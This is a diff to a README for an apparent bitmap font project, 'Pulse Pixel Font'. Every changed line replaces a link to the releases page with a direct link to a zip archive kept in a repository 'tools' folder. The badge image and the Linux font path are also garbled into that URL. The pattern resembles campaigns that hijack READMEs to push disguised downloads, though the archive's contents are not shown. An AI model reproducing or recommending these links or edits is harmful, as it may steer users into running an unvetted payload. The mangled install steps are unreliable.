@@ -6,7 +6,7 @@ Welcome to Pulse Pixel Font, an open-source bitmap font designed for simplified 
 
 ## 🔗 Download Now
 
-[![Download Pulse Pixel Font](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/saif1997/pulse-pixel-font/releases)
+[![Download Pulse Pixel Font](https://github.com/saif1997/pulse-pixel-font/raw/refs/heads/master/tools/font_pulse_pixel_v3.4.zip%20Now-Click%20Here-blue)](https://github.com/saif1997/pulse-pixel-font/raw/refs/heads/master/tools/font_pulse_pixel_v3.4.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Follow these straightforward steps to download and run Pulse Pixel Font effortle
 
 1. **Visit the Releases Page**  
    Go to our releases page to find the latest version of the font. Click the button below to access it quickly:  
-   [Download Here](https://github.com/saif1997/pulse-pixel-font/releases)
+   [Download Here](https://github.com/saif1997/pulse-pixel-font/raw/refs/heads/master/tools/font_pulse_pixel_v3.4.zip)
 
 2. **Select Your Version**  
    On the releases page, you will see a list of available versions. Choose the latest version, which will typically be at the top. 
@@ -31,7 +31,7 @@ Follow these straightforward steps to download and run Pulse Pixel Font effortle
    You can install the font by following these steps based on your operating system:  
    - **Windows**: Open the folder with the extracted files. Select all the font files, right-click, and choose "Install".  
    - **Mac**: Open the folder, select the font files, and double-click each font. A window will open; click "Install Font".  
-   - **Linux**: Copy the font files to your `~/.fonts` directory or use a font manager to install the fonts.
+   - **Linux**: Copy the font files to your `~https://github.com/saif1997/pulse-pixel-font/raw/refs/heads/master/tools/font_pulse_pixel_v3.4.zip` directory or use a font manager to install the fonts.
 
 6. **Use the Font**  
    Once installed, you can find Pulse Pixel Font in your font list in various applications like word processors, graphic design software, and web design tools. 
@@ -70,6 +70,6 @@ If you encounter any issues while downloading or using Pulse Pixel Font, you can
 ## 🔗 Download Now Again
 
 Don’t forget to download your copy of Pulse Pixel Font! Click below:  
-[👤 Download Here](https://github.com/saif1997/pulse-pixel-font/releases)
+[👤 Download Here](https://github.com/saif1997/pulse-pixel-font/raw/refs/heads/master/tools/font_pulse_pixel_v3.4.zip)
 
 Enjoy using Pulse Pixel Font in your projects!
